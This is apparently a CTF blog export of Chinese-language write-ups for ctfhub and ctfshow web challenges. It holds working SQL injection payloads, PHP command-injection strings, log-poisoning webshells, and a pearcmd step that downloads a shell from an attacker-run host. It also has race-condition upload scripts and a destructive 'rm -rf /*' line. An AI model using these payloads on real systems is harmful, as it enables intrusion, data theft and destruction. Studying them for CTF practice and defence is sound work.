<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/image-20230310095210033.png" alt="image-20230310095210033"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1 union select 1,umremmalnq from sqli.fddqhlosgo</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/image-20230310095301878.png" alt="image-20230310095301878"></p>
<h2 id="Cookie注入"><a href="#Cookie注入" class="headerlink" title="Cookie注入"></a>Cookie注入</h2><p>提示是cookie注入，随便发点cookie过去</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202303262211721.png" alt="image-202303262211721"></p>
<p>那就发cookie id过去</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202303262214650.png" alt="image-20230326221312259"></p>
<p>显然是普通的数字注入，order by尝试之后有两列</p>
<p>那就用一般的联合注入union select</p>
<p>构造id&#x3D;-1 union select 1,code查找</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202303262216303.png" alt="image-20230326221603268"></p>
<p>已经成功注入了，看得出来数据库是sqli</p>
<p>爆库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=-1 union select 1,group_concat(schema_name) from information_schema.schemata</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202303262217257.png" alt="image-20230326221717225"></p>
<p>爆表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema = database() </span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202303262217179.png" alt="image-20230326221754150"></p>
<p>爆字段</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=-1 union select 1,group_concat(column_name) from information_schema.columns where table_name = &#x27;gpdznzrugt&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202303262218763.png" alt="image-20230326221827733"></p>
<p>爆值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=-1 union select 1,rgbrnkhfep from sqli.gpdznzrugt</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202303262219457.png" alt="image-20230326221914424"></p>
<h2 id="UA注入"><a href="#UA注入" class="headerlink" title="UA注入"></a>UA注入</h2><p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202305082200993.png" alt="image-20230508220028924"></p>
<p>用hackbar重新发一遍请求</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-Agent=-1 union select database(),1#</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202305082203345.png" alt="image-20230508220334316"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-Agent=-1 union select group_concat(table_name),1 from information_schema.tables where table_schema=&#x27;sqli&#x27;#</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-Agent=-1 union select group_concat(column_name),1 from information_schema.columns where table_name=&#x27;nnzwsnydwo&#x27;#</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-Agent=-1 union select pekzosqxfm,1 from sqli.nnzwsnydwo#</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202305082210184.png" alt="image-20230508221053144"></p>
<h2 id="Refer注入"><a href="#Refer注入" class="headerlink" title="Refer注入"></a>Refer注入</h2><p>同UA</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Referer=-1 union select group_concat(table_name),1 from information_schema.tables where table_schema=&#x27;sqli&#x27;#</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Referer=-1 union select group_concat(column_name),1 from information_schema.columns where table_name=&#x27;uakovlxjab&#x27;#</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Referer=-1 union select hkjndazhbu,1 from sqli.uakovlxjab#</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202305082216660.png" alt="image-20230508221601615"></p>
<h2 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h2><p>常见的有&#x2F;**&#x2F;,(),%0a</p>
<p>经尝试可以用&#x2F;**&#x2F;绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1/**/union/**/select/**/database(),1#</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1/**/union/**/select/**/group_concat(table_name),1/**/from/**/information_schema.tables/**/where/**/table_schema=&#x27;sqli&#x27;#</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1/**/union/**/select/**/group_concat(column_name),1/**/from/**/information_schema.columns/**/where/**/table_name=&#x27;vihvhlsoyv&#x27;#</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1/**/union/**/select/**/kfqwbuiugf,1/**/from/**/sqli.vihvhlsoyv#</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202305082229910.png" alt="image-20230508222955876"></p>
<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h2 id="无验证"><a href="#无验证" class="headerlink" title="无验证"></a>无验证</h2><p>一句话木马</p>
<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/image-20230228103421787.png" alt="image-20230228103421787"></p>
<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/image-20230228103436838.png" alt="image-20230228103436838"></p>
<h2 id="前端验证"><a href="#前端验证" class="headerlink" title="前端验证"></a>前端验证</h2><p>禁用js之后一句话🐴</p>
<h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1>]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>ctfhub</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow_萌新</title>
    <url>/2024/01/07/ctfshow_%E8%90%8C%E6%96%B0/</url>
    <content><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_GET[&#x27;id&#x27;]))&#123;</span><br><span class="line">    $id = $_GET[&#x27;id&#x27;];</span><br><span class="line">    # 判断id的值是否大于999</span><br><span class="line">    if(intval($id) &gt; 999)&#123;</span><br><span class="line">        # id 大于 999 直接退出并返回错误</span><br><span class="line">        die(&quot;id error&quot;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        # id 小于 999 拼接sql语句</span><br><span class="line">        $sql = &quot;select * from article where id = $id order by id limit 1 &quot;;</span><br><span class="line">        echo &quot;执行的sql为：$sql&lt;br&gt;&quot;;</span><br><span class="line">        # 执行sql 语句</span><br><span class="line">        $result = $conn-&gt;query($sql);</span><br><span class="line">        # 判断有没有查询结果</span><br><span class="line">        if ($result-&gt;num_rows &gt; 0) &#123;</span><br><span class="line">            # 如果有结果，获取结果对象的值$row</span><br><span class="line">            while($row = $result-&gt;fetch_assoc()) &#123;</span><br><span class="line">                echo &quot;id: &quot; . $row[&quot;id&quot;]. &quot; - title: &quot; . $row[&quot;title&quot;]. &quot; &lt;br&gt;&lt;hr&gt;&quot; . $row[&quot;content&quot;]. &quot;&lt;br&gt;&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        # 关闭数据库连接</span><br><span class="line">        $conn-&gt;close();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;!-- flag in id = 1000 --&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>目标就是让intval($id) &lt;&#x3D; 999的同时$id&#x3D;1000</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=999%2B1</span><br><span class="line">+用urlencode-&gt;%2B</span><br><span class="line">?id=10 or id=1000#从sql语句入手</span><br></pre></td></tr></table></figure>

<h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>和上一题比只多了个</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(preg_match(&quot;/or|\+/i&quot;,$id))</span><br></pre></td></tr></table></figure>

<p>只要不出现or或者+就可以了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=100*10</span><br><span class="line">?id=10||id=1000#从sql语句入手</span><br></pre></td></tr></table></figure>

<h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p>修改了匹配规则</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">preg_match(&quot;/or|\-|\\|\*|\&lt;|\&gt;|\!|x|hex|\+/i&quot;,$id)</span><br></pre></td></tr></table></figure>

<p>intval如果转换字符串的时候，先判断是否以数字开头。当传入’1000’时，以’开头，直接返回0</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=&#x27;1000&#x27;</span><br><span class="line">$b=$_GET[&#x27;b&#x27;]</span><br><span class="line">当传入?b=&#x27;1000&#x27;时,分别var_dump $a和$b,返回的结果不一样</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=&#x27;1000&#x27;</span><br></pre></td></tr></table></figure>

<h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">preg_match(&quot;/or|\-|\\\|\/|\\*|\&lt;|\&gt;|\!|x|hex|\(|\)|\+|select/i&quot;,$id)</span><br></pre></td></tr></table></figure>

<p>还是web3的原则，利用取反符号，intval遇到~会判断为字符串，得到0绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=~~1000</span><br></pre></td></tr></table></figure>

<h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">preg_match(&quot;/\&#x27;|\&quot;|or|\||\-|\\\|\/|\\*|\&lt;|\&gt;|\!|x|hex|\(|\)|\+|select/i&quot;, $id)</span><br></pre></td></tr></table></figure>

<p>继续取反</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=~~1000</span><br></pre></td></tr></table></figure>

<h2 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">preg_match(&quot;/\&#x27;|\&quot;|or|\||\-|\\\|\/|\\*|\&lt;|\&gt;|\^|\!|x|hex|\(|\)|\+|select/i&quot;,$id)</span><br></pre></td></tr></table></figure>

<p>继续</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=~~1000</span><br></pre></td></tr></table></figure>

<h2 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">preg_match(&quot;/\&#x27;|\&quot;|or|\||\-|\\\|\/|\\*|\&lt;|\&gt;|\^|\!|\~|x|hex|\(|\)|\+|select/i&quot;,$id)</span><br></pre></td></tr></table></figure>

<p>intval默认给的base是10，当base给到0的时候，才会根据传入的值动态判断base。base10解析之后的0b1111101000应该是int(0)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=0b1111101000</span><br></pre></td></tr></table></figure>

<h2 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"># 包含数据库连接文件,key flag 也在里面定义</span><br><span class="line">include(&quot;config.php&quot;);</span><br><span class="line"># 判断get提交的参数id是否存在</span><br><span class="line">if(isset($_GET[&#x27;flag&#x27;]))&#123;</span><br><span class="line">        if(isset($_GET[&#x27;flag&#x27;]))&#123;</span><br><span class="line">                $f = $_GET[&#x27;flag&#x27;];</span><br><span class="line">                if($key===$f)&#123;</span><br><span class="line">                        echo $flag;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>傻逼题</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?flag=rm -rf /*</span><br></pre></td></tr></table></figure>

<h2 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">        $c = $_GET[&#x27;c&#x27;];</span><br><span class="line">        if(preg_match(&quot;/system|exec|highlight/i&quot;,$c))&#123;</span><br><span class="line">                eval($c);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            die(&quot;cmd error&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">        highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>傻逼了，以为看的是!preg_match，最开始用的php:&#x2F;&#x2F;input伪协议绕过</p>
<p>结果这么简单</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=system(&#x27;cat config&#x27;|base64)</span><br></pre></td></tr></table></figure>

<h2 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(!preg_match(&quot;/system|exec|highlight/i&quot;,$c))</span><br></pre></td></tr></table></figure>

<p>换用passthru()函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=passthru(&#x27;cat config.php|base64&#x27;);</span><br></pre></td></tr></table></figure>

<h2 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(!preg_match(&quot;/system|exec|highlight|cat/i&quot;,$c))</span><br></pre></td></tr></table></figure>

<p>passthru+tac</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=passthru(&#x27;tac config.php|base64&#x27;);</span><br></pre></td></tr></table></figure>

<h2 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(!preg_match(&quot;/system|exec|highlight|cat|\.|php|config/i&quot;,$c))</span><br></pre></td></tr></table></figure>

<p>禁止的字符新增了. php config</p>
<p>考虑使用通配符</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=passthru(&#x27;tac c*|base64&#x27;);</span><br></pre></td></tr></table></figure>

<h2 id="web13"><a href="#web13" class="headerlink" title="web13"></a>web13</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(!preg_match(&quot;/system|exec|highlight|cat|\.|\;|file|php|config/i&quot;,$c))</span><br></pre></td></tr></table></figure>

<p>亏贼，<code>?&gt;</code>能代替<code>;</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=passthru(&#x27;tac c*|base64&#x27;)?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(!preg_match(&quot;/system|exec|highlight|cat|\(|\.|\;|file|php|config/i&quot;,$c))</span><br></pre></td></tr></table></figure>

<p>多加了个(，其实还挺低能的，在上面也能用统一方法直接echo出来</p>
<p>就是需要把;换成?&gt;</p>
<p>参考</p>
<blockquote>
<p>代码不能包含打开&#x2F;关闭 <a href="https://www.php.net/manual/zh/language.basic-syntax.phpmode.php">PHP tags</a>。比如， <code>&#39;echo &quot;Hi!&quot;;&#39;</code> 不能这样传入： <code>&#39;&lt;?php echo &quot;Hi!&quot;; ?&gt;&#39;</code>。但仍然可以用合适的 PHP tag 来离开、重新进入 PHP 模式。比如 <code>&#39;echo &quot;In PHP mode!&quot;; ?&gt;In HTML mode!&lt;?php echo &quot;Back in PHP mode!&quot;;&#39;</code>。</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=echo $flag?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="web15"><a href="#web15" class="headerlink" title="web15"></a>web15</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(!preg_match(&quot;/system|\\*|\?|\&lt;|\&gt;|\=|exec|highlight|cat|\(|\.|file|php|config/i&quot;,$c))</span><br></pre></td></tr></table></figure>

<p>把&lt;&gt;?全过滤了，没发离开php模式，但没禁用;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=echo $flag;</span><br></pre></td></tr></table></figure>

<h2 id="web16"><a href="#web16" class="headerlink" title="web16"></a>web16</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(md5(&quot;ctfshow$c&quot;)===&quot;a6f57ae38a22448c2f07f3f95f49c84e&quot;)</span><br></pre></td></tr></table></figure>

<p>脑残，md5逆向之后是ctfshow36d</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=36d</span><br></pre></td></tr></table></figure>

<h2 id="web17"><a href="#web17" class="headerlink" title="web17"></a>web17</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(!preg_match(&quot;/php/i&quot;,$c))&#123;</span><br><span class="line">               include($c);</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure>

<p>看到include，第一时间想的伪协议。换用了data也因为被禁用没有成功</p>
<p><code>data:// wrapper is disabled in the server configuration by allow_url_include=0</code></p>
<p>看了wp才知道，只是包含日志</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure>

<p>通过日志看得出来会记录UA</p>
<p>那就修改UA为一句话木马</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202309181325686.png" alt="image-20230918132518605"></p>
<p>然后访问带着一句话木马的UA访问一遍网站，等写进去再打一遍</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=/var/log/nginx/access.log</span><br><span class="line">test=system(&#x27;cat 36d.php|base64&#x27;);</span><br></pre></td></tr></table></figure>

<h2 id="web18"><a href="#web18" class="headerlink" title="web18"></a>web18</h2><p>只在$_GET[‘c’]里多加入了对file的过滤，同上↑</p>
<h2 id="web19"><a href="#web19" class="headerlink" title="web19"></a>web19</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(!preg_match(&quot;/php|file|base/i&quot;,$c))</span><br></pre></td></tr></table></figure>

<p>同理</p>
<h2 id="web20"><a href="#web20" class="headerlink" title="web20"></a>web20</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(!preg_match(&quot;/php|file|base|rot/i&quot;,$c))</span><br></pre></td></tr></table></figure>

<p>同理</p>
<h2 id="web21"><a href="#web21" class="headerlink" title="web21"></a>web21</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(!preg_match(&quot;/php|file|\:|base|rot/i&quot;,$c))</span><br></pre></td></tr></table></figure>

<p>同上</p>
<h2 id="web22"><a href="#web22" class="headerlink" title="web22"></a>web22</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(!preg_match(&quot;/\:|\/|\\\/i&quot;,$c))</span><br></pre></td></tr></table></figure>

<p>亏贼，难度一下上来了，完全没有思路</p>
<p><a href="https://blog.csdn.net/qq_46091464/article/details/108954166">https://blog.csdn.net/qq_46091464/article/details/108954166</a></p>
<blockquote>
<p>‘<a href="https://www.php.net/manual/zh/reserved.variables.argv.php">argv</a>‘</p>
<p>传递给该脚本的参数的数组。当脚本以命令行方式运行时，argv 变量传递给程序 C 语言样式的命令行参数。当通过 GET 方式调用时，该变量包含query string。</p>
<p>‘<a href="https://www.php.net/manual/zh/reserved.variables.argc.php">argc</a>‘</p>
<p>包含命令行模式下传递给该脚本的参数的数目(如果运行在命令行模式下)。</p>
</blockquote>
<p>当正常传入?c&#x3D;xxx&amp;b&#x3D;xx时，$_SERVER[‘argc’]的值始终是1</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202309181651302.png" alt="image-20230918165121242"></p>
<p>但是略加修改，?c&#x3D;xxx&amp;+b&#x3D;xx时，就变成了2。</p>
<p>而环境内极其傻逼的还有一个pearcmd.php，pearcmd有一个download功能可以从外部下载php文件</p>
<p>那就是包含了pearcmd.php，然后通过+分隔，执行download命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">攻击机:</span><br><span class="line">echo &quot;&lt;?php system(&#x27;cat 3*|base64&#x27;);?&gt;&quot;&gt;shell.php</span><br><span class="line">python3 -m http.server 81</span><br><span class="line">靶机:</span><br><span class="line">?c=pearcmd&amp;+download+http://ip:81/shell.php</span><br><span class="line">/shell.php</span><br></pre></td></tr></table></figure>

<h2 id="获得百分之百的快乐"><a href="#获得百分之百的快乐" class="headerlink" title="获得百分之百的快乐"></a>获得百分之百的快乐</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(strlen($_GET[1])&lt;4)&#123;</span><br><span class="line">     echo shell_exec($_GET[1]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>要求传入1的长度&lt;4，太牛逼了</p>
<p>直接跑个ls，发现名字都很靠后</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202309181755031.png" alt="image-20230918175530980"></p>
<p>tip:在linux上，直接执行&gt;name可以创建一个名为name的文件并往里写东西</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202309181757349.png" alt="image-20230918175716313"></p>
<blockquote>
<p>在Linux的Shell环境下，直接执行星号（*）通常会触发通配符展开（Wildcard Expansion）操作，其效果是匹配当前目录下的所有文件和目录（除了以点开头的隐藏文件和隐藏目录）并将它们作为参数传递给相应的命令。这是因为星号（*）是通配符，用于匹配零个或多个字符。</p>
</blockquote>
<p>直接输*会把当前文件夹下的第一个文件名作为命令，剩余的文件名作为参数</p>
<p>如果当前文件夹下有文件：cat，test。执行*的效果等价于cat test</p>
<p>除了cat，还有nl这个命令同样可以用来显示内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?1=&gt;nl</span><br><span class="line">?1=*</span><br></pre></td></tr></table></figure>



<h2 id="web23"><a href="#web23" class="headerlink" title="web23"></a>web23</h2><p>第一次遇到竞争上传，学习一下</p>
<p>其实每次上传成功之后都要等一下就该意识到有个sleep然后想到竞争上传的</p>
<p>源码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$new_filename = date(&#x27;YmdHis&#x27;,time()).rand(100,1000).&#x27;.&#x27;.$ext_suffix;</span><br><span class="line">if (move_uploaded_file($temp_name, &#x27;uploads/&#x27;.$new_filename))&#123;</span><br><span class="line">	echo &quot;uploads/$new_filename&quot;;</span><br><span class="line">	sleep(1);</span><br><span class="line">	system(&quot;rm -rf ./uploads/*.php&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>有爆破脚本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># coding: utf-8</span><br><span class="line"># Auth: y2hlbmc</span><br><span class="line"> </span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">import threading</span><br><span class="line"> </span><br><span class="line">url = &quot;http://0d33429a-38e4-4c4e-8d57-16fca7d5eab1.challenge.ctf.show/&quot;</span><br><span class="line"> </span><br><span class="line">def Thread(fun,*args):</span><br><span class="line">    return threading.Thread(target=fun, args=args)</span><br><span class="line"> </span><br><span class="line">def req(fname):</span><br><span class="line">    r = requests.get(url + &quot;uploads/&quot; + fname + &quot;.php&quot;)</span><br><span class="line">    x = r.text</span><br><span class="line">    if len(x) &gt; 0 and &quot;404 Not Found&quot; not in x and &quot;容器已过期&quot; not in x:</span><br><span class="line">        print(x)</span><br><span class="line"> </span><br><span class="line">def Thread_start(fname):</span><br><span class="line">    for i in range(100,400):</span><br><span class="line">        # 每个文件名单起一个线程</span><br><span class="line">        Thread(req, fname + str(i)).start()</span><br><span class="line"> </span><br><span class="line">def upload():</span><br><span class="line">    while True:</span><br><span class="line">    	# 指定每次上传文件的内容</span><br><span class="line">        file_data = &#123;&#x27;file&#x27;:(&#x27;shell.php&#x27;,&quot;&lt;?php system(\&quot;ls -l ../\&quot;);?&gt;&quot;.encode())&#125;</span><br><span class="line">        r = requests.post(url + &quot;upload.php&quot;,files=file_data)</span><br><span class="line">        txt = r.text</span><br><span class="line">        print(&quot;uploaded:&quot;,txt)</span><br><span class="line">        # 用本次的文件名推算下一次的文件名，相差sleep一次的时间间隔</span><br><span class="line">        ts = int(time.mktime(time.strptime(txt[8:22], &quot;%Y%m%d%H%M%S&quot;)))</span><br><span class="line">        fname = time.strftime(&quot;%Y%m%d%H%M%S&quot;, time.localtime(ts + 1))</span><br><span class="line">        # 单起一个线程，爆破下一次upload的文件名</span><br><span class="line">        Thread(Thread_start, fname).start()</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    upload()</span><br></pre></td></tr></table></figure>

<p>当然也可以用bp+python一起爆</p>
<p>具体思路是bp用instruder一直发送上传包</p>
<p>python用当前时间+range+thread一直爆</p>
<p>如果不采用推算文件名和多线程的方法，想要在来回时延下做到1s内访问到是非常困难的，所以下面代码的成功率极低</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file_data = &#123;&#x27;file&#x27;: (&#x27;shell.php&#x27;, &quot;&lt;?php system(\&quot;ls -l ../\&quot;);?&gt;&quot;.encode())&#125;</span><br><span class="line">r = requests.post(url + &quot;upload.php&quot;, files = file_data)</span><br><span class="line">txt = r.text</span><br><span class="line"># print(&quot;uploaded:&quot;, txt)</span><br><span class="line">r = requests.get(url + &quot;uploads/&quot; + txt)</span><br><span class="line">x = r.text</span><br><span class="line">if len(x) &gt; 0 and &quot;404 Not Found&quot; not in x and &quot;容器已过期&quot; not in x:</span><br><span class="line">print(x)</span><br></pre></td></tr></table></figure>

<h2 id="web24"><a href="#web24" class="headerlink" title="web24"></a>web24</h2><p>一样是竞争上传的题目，把range减少，时间增加了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># coding: utf-8</span><br><span class="line"># Auth: y2hlbmc</span><br><span class="line"> </span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">import threading</span><br><span class="line"> </span><br><span class="line">url = &quot;http://aa167920-a54b-498c-bf8e-877615061128.challenge.ctf.show/&quot;</span><br><span class="line"> </span><br><span class="line">def Thread(fun,*args):</span><br><span class="line">    return threading.Thread(target=fun, args=args)</span><br><span class="line"> </span><br><span class="line">def req(fname):</span><br><span class="line">    r = requests.get(url + &quot;uploads/&quot; + fname + &quot;.php&quot;)</span><br><span class="line">    x = r.text</span><br><span class="line">    if len(x) &gt; 0 and &quot;404 Not Found&quot; not in x and &quot;容器已过期&quot; not in x:</span><br><span class="line">        print(x)</span><br><span class="line"> </span><br><span class="line">def Thread_start(fname):</span><br><span class="line">    for i in range(100,300):</span><br><span class="line">        # 每个文件名单起一个线程</span><br><span class="line">        Thread(req, fname + str(i)).start()</span><br><span class="line"> </span><br><span class="line">def upload():</span><br><span class="line">    while True:</span><br><span class="line">    	# 指定每次上传文件的内容</span><br><span class="line">        file_data = &#123;&#x27;file&#x27;:(&#x27;shell.php&#x27;,&quot;&lt;?php system(\&quot;ls -l ../\&quot;);?&gt;&quot;.encode())&#125;</span><br><span class="line">        r = requests.post(url + &quot;upload.php&quot;,files=file_data)</span><br><span class="line">        txt = r.text</span><br><span class="line">        print(&quot;uploaded:&quot;,txt)</span><br><span class="line">        # 用本次的文件名推算下一次的文件名，相差sleep一次的时间间隔</span><br><span class="line">        ts = int(time.mktime(time.strptime(txt[8:22], &quot;%Y%m%d%H%M%S&quot;)))</span><br><span class="line">        fname = time.strftime(&quot;%Y%m%d%H%M%S&quot;, time.localtime(ts + 3))</span><br><span class="line">        # 单起一个线程，爆破下一次upload的文件名</span><br><span class="line">        Thread(Thread_start, fname).start()</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    upload()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>题解</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow愚人杯</title>
    <url>/2024/01/07/2023ctfshow%E6%84%9A%E4%BA%BA%E6%9D%AF/</url>
    <content><![CDATA[<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>hint如下:</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202304042119063.png" alt="image-20230404211906983"></p>
<p>没想到他flag直接就是中文”一个不能说的秘密”，涨见识了</p>
